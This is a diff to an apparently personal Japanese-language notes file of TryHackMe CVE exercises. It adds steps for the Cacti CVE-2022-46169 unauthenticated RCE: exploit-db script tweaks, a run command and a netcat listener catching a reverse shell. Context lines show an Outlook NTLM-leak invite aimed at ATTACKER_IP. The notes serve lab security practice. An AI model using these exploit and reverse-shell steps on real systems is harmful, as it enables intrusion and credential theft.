@@ -524,6 +524,32 @@ Import-Module .\CVE-2023-23397.ps1
 Send-CalendarNTLMLeak -recipient "test@thm.loc" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "THM Meeting" -meetingbody "This is just a regular meeting invitation :)"
 ```
 
+## CVE-2022-46169 (Cacti)
+
+https://tryhackme.com/room/cactus
+
+- `Cacti 1.2.3` より前の全バージョン
+- 認証不要のRCE
+
+### エクスプロイト
+
+https://www.exploit-db.com/raw/51166
+
+- `proxies=proxy` を削除
+- `'X-Forwarded-For': f'127.0.0.1'` に変更
+
+```sh
+python3 51166.py -u http://10.201.84.165/cacti/ -i 10.11.146.32 -p 6666
+```
+
+```sh
+$ nc -lnvp 6666
+listening on [any] 6666 ...
+connect to [10.11.146.32] from (UNKNOWN) [10.201.84.165] 58468
+bash: no job control in this shell
+bash-4.2$
+```
+
 ## CVE-2022-30190 (Follina MSDT)
 
 https://tryhackme.com/room/follinamsdt
